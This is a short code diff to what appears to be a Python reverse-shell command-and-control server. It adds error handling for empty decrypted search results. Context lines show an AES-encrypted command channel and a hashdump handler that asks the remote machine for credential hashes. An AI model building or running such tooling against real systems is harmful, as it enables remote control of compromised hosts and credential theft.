@@ -226,8 +226,14 @@ class ReverseShellServer:
             decrypted_data = AESCipher.decrypt(data.decode("utf-8"))
             print("[+] Search Results:")
             print(decrypted_data)
+        except IndexError as e:
+            if str(e) == "string index out of range":
+                print("[x] Decryption failed: Command return nothing before EOF")
+            else:
+                print(f"[x] An IndexError occurred: {e}")
         except Exception as e:
             print(f"[x] Failed to decrypt search data: {e}")
+
 
     def handle_hashdump(self, conn):
         conn.send(AESCipher.encrypt("hashdump").encode("utf-8"))
